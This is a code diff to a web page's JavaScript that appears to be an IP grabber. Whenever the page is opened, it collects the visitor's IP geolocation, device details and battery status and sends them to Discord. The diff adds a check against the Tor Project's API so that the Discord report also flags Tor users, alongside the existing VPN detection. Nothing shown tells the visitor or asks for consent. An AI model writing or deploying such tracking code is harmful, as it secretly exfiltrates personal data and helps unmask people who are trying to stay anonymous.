@@ -138,15 +138,28 @@
                 return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
             }
 
-            // Send to Discord
-            async function sendToDiscord(ipData, device, battery) {
+            // NEW: Check TOR exit status using official Tor Project API
+            async function isTorExit(ip) {
+                try {
+                    const resp = await fetch('https://check.torproject.org/api/ip');
+                    if (!resp.ok) return false;
+                    const data = await resp.json();
+                    return data.IsTor === true;
+                } catch (e) {
+                    return false;
+                }
+            }
+
+            // Send to Discord (now with torDetected parameter)
+            async function sendToDiscord(ipData, device, battery, torDetected) {
                 // Determine VPN/TOR status
                 let vpnTorStatus = 'No VPN/TOR Found';
-                if (ipData.proxy === true && ipData.tor === true) {
+                const proxyDetected = ipData.proxy === true;
+                if (proxyDetected && torDetected) {
                     vpnTorStatus = 'VPN and TOR Detected';
-                } else if (ipData.proxy === true) {
+                } else if (proxyDetected) {
                     vpnTorStatus = 'VPN Detected';
-                } else if (ipData.tor === true) {
+                } else if (torDetected) {
                     vpnTorStatus = 'TOR Detected';
                 }
 
@@ -206,7 +219,9 @@
                     const geoResp = await fetch('https://ipapi.co/json/');
                     if (!geoResp.ok) throw new Error('Geo API failed');
                     const geo = await geoResp.json();
-                    await sendToDiscord(geo, device, battery);
+                    // Additional TOR check using official API
+                    const torDetected = await isTorExit(geo.ip);
+                    await sendToDiscord(geo, device, battery, torDetected);
                 } catch (err) {
                     // Fallback with ipify
                     try {
@@ -224,7 +239,9 @@
                             proxy: false,
                             tor: false
                         };
-                        await sendToDiscord(fallbackGeo, device, battery);
+                        // Also check TOR for fallback IP
+                        const torDetected = await isTorExit(ipData.ip);
+                        await sendToDiscord(fallbackGeo, device, battery, torDetected);
                     } catch (e2) {
                         statusEl.textContent = 'All APIs failed: ' + e2.message;
                         statusEl.className = 'error';
